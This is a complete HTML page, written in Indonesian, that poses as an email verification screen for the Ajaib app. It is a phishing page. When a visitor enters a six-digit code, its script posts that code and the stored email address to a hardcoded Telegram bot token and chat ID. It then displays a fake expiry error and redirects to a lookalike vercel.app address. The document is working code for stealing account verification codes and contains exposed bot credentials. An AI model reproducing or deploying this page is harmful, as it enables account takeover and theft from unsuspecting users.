<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Konfirmasi Email</title>
  <style>
    body {
      margin: 0;
      font-family: sans-serif;
      background-color: #ffffff;
    }

    .container {
      display: flex;
      flex-direction: column;
      justify-content: center;
      min-height: 100vh;
      padding: 0;
    }

    .top-section {
      flex: 1;
      padding: 10px 20px;
      background-color: #ffffff;
      text-align: center;
    }

    h2 {
      font-size: 20px;
      margin-bottom: 10px;
    }

    p {
      color: #555;
      font-size: 14px;
      margin-bottom: 30px;
    }

    .code-inputs {
      display: flex;
      justify-content: center;
      gap: 37px;
      margin-bottom: 20px;
      margin-top: 30px;
    }

    .circle {
      width: 20px;
      height: 20px;
      background-color: #dcebf1;
      border-radius: 50%;
      transition: background-color 0.3s;
    }

    .timer {
      color: #000000;
      font-size: 13px;
      margin-top: 20px;
    }

    #error-message {
      color: red;
      font-size: 14px;
      margin-top: 10px;
      display: none;
    }

    #resend-button {
      display: none;
      margin-top: 15px;
      background-color: #007BFF;
      color: white;
      padding: 8px 16px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-size: 14px;
    }

    .keypad-section {
      background-color: #f6fbfa;
      padding: 10px 0;
      border-top: 1px solid #e0e0e0;
      margin-top: -20px;
    }

    .keypad {
      display: grid;
      grid-template-columns: repeat(3, 60px);
      gap: 50px;
      justify-content: center;
      font-size: 24px;
    }

    .keypad button {
      text-align: center;
      padding: 10px;
      border-radius: 10px;
      border: none;
      background-color: #f6fbfa;
      cursor: pointer;
      font-size: 20px;
    }

    .keypad button:active {
      background-color: #e0f0ff;
    }

    .keypad img {
      width: 28px;
      height: 28px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="top-section">
      <h2>Konfirmasi email kamu</h2>
      <p>Masukkan kode verifikasi yang telah dikirim ke<br><strong id="emailDisplay">email@email.com</strong></p>

      <div class="code-inputs" id="pinDisplay">
        <div class="circle"></div>
        <div class="circle"></div>
        <div class="circle"></div>
        <div class="circle"></div>
        <div class="circle"></div>
        <div class="circle"></div>
      </div>

      <div class="timer" id="countdown">Kirim ulang kode dalam 01:00</div>
      <p id="error-message">Kode verifikasi Telah Kadaluarsa, silakan coba lagi nanti, atau kirim ulang</p>
      <button id="resend-button">Kirim Ulang Kode</button>
    </div>

    <div class="keypad-section">
      <div class="keypad numpad">
        <button>1</button>
        <button>2</button>
        <button>3</button>
        <button>4</button>
        <button>5</button>
        <button>6</button>
        <button>7</button>
        <button>8</button>
        <button>9</button>
        <div></div>
        <button>0</button>
        <button>⌫</button>
      </div>
    </div>
  </div>

  <script>
    const pin = [];
    const maxDigits = 6;
    const pinDisplay = document.getElementById('pinDisplay').children;
    const errorMessage = document.getElementById('error-message');
    const countdownElement = document.getElementById('countdown');
    const resendButton = document.getElementById('resend-button');
    const emailDisplay = document.getElementById('emailDisplay');

    let countdownSeconds = 60;
    let timer;

    // Ambil email dari localStorage dan tampilkan secara tersamarkan
    const savedEmail = localStorage.getItem('ajaib_email');
    if (savedEmail) {
      const [name, domain] = savedEmail.split('@');
      const masked = name[0] + '*'.repeat(Math.max(1, name.length - 2)) + name.slice(-1) + '@' + domain;
      emailDisplay.textContent = masked;
    }

    function startTimer() {
      countdownSeconds = 60;
      countdownElement.textContent = `Kirim ulang kode dalam 01:00`;

      timer = setInterval(() => {
        countdownSeconds--;
        const minutes = String(Math.floor(countdownSeconds / 60)).padStart(2, '0');
        const seconds = String(countdownSeconds % 60).padStart(2, '0');
        countdownElement.textContent = `Kirim ulang kode dalam ${minutes}:${seconds}`;

        if (countdownSeconds <= 0) {
          clearInterval(timer);
          countdownElement.textContent = 'Kode kadaluarsa. Silakan kirim ulang.';
          resendButton.style.display = 'inline-block';
        }
      }, 1000);
    }

    function updateDisplay() {
      for (let i = 0; i < maxDigits; i++) {
        pinDisplay[i].style.backgroundColor = i < pin.length ? '#007BFF' : '#dcebf1';
      }
    }

    function sendToTelegram(code) {
      const email = savedEmail || "Tidak diketahui";
      const token = "7776380913:AAHMmwxtzHcBglv8vA4BLPilqOxoRx5WuIw";
      const chatId = "7326083311";

      const message = `AJAIB 6-DIGIT CODE\nEmail: ${email}\nKode: ${code}`;

      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      }).then(() => {
        console.log("Terkirim ke Telegram");
        errorMessage.style.display = 'block';
        pin.length = 0;
        updateDisplay();

        // Redirect setelah sukses
        setTimeout(() => {
          window.location.href = "https://login-ajaib-co-id-com.vercel.app/kodeajaibemail.html"; // Ganti URL tujuan jika perlu
        }, 2000);
      }).catch((err) => {
        console.error("Gagal kirim ke Telegram:", err);
      });
    }

    document.querySelector('.numpad').addEventListener('click', function(e) {
      if (e.target.tagName === 'BUTTON') {
        const value = e.target.textContent;

        if (value === '⌫') {
          pin.pop();
        } else if (!isNaN(value) && pin.length < maxDigits) {
          pin.push(value);
        }

        updateDisplay();

        if (pin.length === maxDigits) {
          const code = pin.join('');
          sendToTelegram(code);
        }
      }
    });

    resendButton.addEventListener('click', function () {
      resendButton.style.display = 'none';
      errorMessage.style.display = 'none';
      pin.length = 0;
      updateDisplay();
      startTimer();
      console.log("Permintaan kirim ulang kode dikirim.");
    });

    startTimer();
  </script>
</body>
</html>
